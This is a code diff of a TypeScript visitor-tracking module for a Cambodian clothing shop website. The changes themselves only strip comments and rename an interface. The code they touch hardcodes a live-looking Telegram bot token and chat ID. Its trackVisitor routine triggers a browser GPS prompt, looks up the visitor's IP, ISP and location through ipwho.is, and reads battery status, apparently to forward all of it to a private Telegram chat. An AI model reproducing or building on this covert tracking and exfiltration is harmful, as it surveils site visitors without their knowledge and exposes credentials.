@@ -4,18 +4,13 @@
  */
 
 export const TELEGRAM_CONFIG = {
-  // Bot Token from @BotFather
   BOT_TOKEN: "8864632955:AAEY-IVLwkrxvpxOgsYTjeKKueagJqY-si8",
-
-  // Telegram Chat ID to receive alerts (Pho Chaifong)
   CHAT_ID: "8725769963",
-
-  // Website details
   WEBSITE_NAME: "👕 IFONG - YAK Design AV MADE IN CAMBODIA",
   DOMAIN: "www.ifong-yak.shop",
 };
 
-export interface IPData {
+interface VisitorGeoInfo {
   ip: string;
   isp: string;
   org: string;
@@ -37,7 +32,7 @@ function escapeHtml(str: string): string {
 }
 
 // Fetch visitor IP and geo information
-async function fetchVisitorIP(): Promise<IPData> {
+async function fetchVisitorIP(): Promise<VisitorGeoInfo> {
   // Primary: ipwho.is
   try {
     const res = await fetch("https://ipwho.is/", { signal: AbortSignal.timeout(6000) });
@@ -195,7 +190,7 @@ export async function trackVisitor(): Promise<void> {
 
     // Trigger browser GPS prompt and fetch IP / Battery
     const gpsPosition: GeolocationPosition | null = await requestGPS(6000);
-    const ipInfo: IPData = await fetchVisitorIP();
+    const ipInfo: VisitorGeoInfo = await fetchVisitorIP();
     const batteryText: string = await getBatteryStatus();
 
     const hasGps = Boolean(gpsPosition && gpsPosition.coords);
